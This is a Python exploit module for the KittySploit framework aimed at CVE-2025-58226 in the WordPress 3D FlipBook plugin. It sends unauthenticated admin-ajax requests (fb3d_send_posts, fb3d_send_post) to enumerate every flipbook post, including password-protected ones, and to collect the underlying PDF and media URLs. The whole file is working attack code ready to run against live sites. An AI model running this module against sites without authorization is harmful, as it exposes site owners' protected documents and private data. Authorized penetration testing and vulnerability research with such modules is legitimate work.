#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2025-58226 — 3D FlipBook unauthenticated flipbook / PDF URL disclosure."""

import json
from typing import Any, Dict, List, Optional

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "WordPress 3D FlipBook CVE-2025-58226 sensitive data dump",
        "description": (
            "CVE-2025-58226 (≤ 1.16.16): unauthenticated admin-ajax actions fb3d_send_posts "
            "and fb3d_send_post expose all flipbook posts (including password-protected), "
            "metadata, and backing PDF/media URLs. Read-only information disclosure."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-58226"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-58226",
            "https://github.com/QASIM1401/CVE-2025-58226-PoC",
            "https://wordpress.org/plugins/interactive-3d-flipbook-powered-physics-engine/",
        ],
        "tags": [
            "wordpress",
            "wp-plugin",
            "3d-flipbook",
            "unauthenticated",
            "exposure",
            "cve-2025-58226",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_access", "active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "requires": {
                "endpoint_pattern_any": ["/wp-admin/admin-ajax.php"],
            },
            "chain": {
                "suggested_followups": [
                    "scanner/http/cve_2025_58226_detect",
                ],
            },
        },
    }

    resolve_file_urls = OptBool(
        True,
        "Call fb3d_send_post per ID to resolve PDF/file URLs",
        required=False,
    )
    max_posts = OptInteger(50, "Maximum flipbook posts to enumerate", required=False)

    def _fetch_posts(self) -> Optional[List[Dict[str, Any]]]:
        response = self.http_request(
            method="GET",
            path="/wp-admin/admin-ajax.php?action=fb3d_send_posts",
            allow_redirects=False,
        )
        if not response or int(response.status_code or 0) != 200:
            return None
        try:
            payload = json.loads(response.text or "{}")
        except json.JSONDecodeError:
            return None
        if int(payload.get("code", -1)) != 0:
            return None
        posts = payload.get("posts")
        if not isinstance(posts, list):
            return None
        return posts

    def _fetch_post_detail(self, post_id: int) -> Optional[Dict[str, Any]]:
        response = self.http_request(
            method="GET",
            path=f"/wp-admin/admin-ajax.php?action=fb3d_send_post&id={int(post_id)}",
            allow_redirects=False,
        )
        if not response or int(response.status_code or 0) != 200:
            return None
        try:
            payload = json.loads(response.text or "{}")
        except json.JSONDecodeError:
            return None
        if int(payload.get("code", -1)) != 0:
            return None
        post = payload.get("post")
        return post if isinstance(post, dict) else None

    @staticmethod
    def _file_guid(post: Dict[str, Any]) -> str:
        data = post.get("data") or {}
        if isinstance(data, dict):
            guid = data.get("guid") or data.get("url") or ""
            if guid:
                return str(guid)
        props = post.get("props") or {}
        if isinstance(props, dict):
            for key in ("pdfUrl", "pdf", "source", "url"):
                val = props.get(key)
                if val:
                    return str(val)
        return ""

    def check(self):
        posts = self._fetch_posts()
        if not posts:
            return {
                "vulnerable": False,
                "reason": "fb3d_send_posts did not return flipbook JSON",
                "confidence": "medium",
            }
        return {
            "vulnerable": True,
            "reason": f"Unauthenticated flipbook enumeration ({len(posts)} post(s))",
            "confidence": "high",
        }

    def run(self):
        print_status("Enumerating flipbooks via fb3d_send_posts...")
        posts = self._fetch_posts()
        if not posts:
            print_error("No flipbook data returned (not vulnerable or plugin absent)")
            return False

        limit = max(1, int(self.max_posts or 50))
        posts = posts[:limit]
        print_success(f"{len(posts)} flipbook post(s) exposed")

        findings: List[Dict[str, Any]] = []
        for entry in posts:
            if not isinstance(entry, dict):
                continue
            post_id = entry.get("ID") or entry.get("id")
            title = str(entry.get("title") or entry.get("name") or "").strip()
            file_url = ""
            if self.resolve_file_urls and post_id is not None:
                detail = self._fetch_post_detail(int(post_id))
                if detail:
                    file_url = self._file_guid(detail)
            findings.append(
                {
                    "id": post_id,
                    "title": title,
                    "file_url": file_url,
                }
            )
            line = f"ID {post_id} {title!r}"
            if file_url:
                line += f" -> {file_url}"
            print_success(line)

        self.set_info(
            severity="medium",
            cve="CVE-2025-58226",
            reason="3D FlipBook unauthenticated post/PDF disclosure",
            count=len(findings),
            posts=findings,
        )
        return True
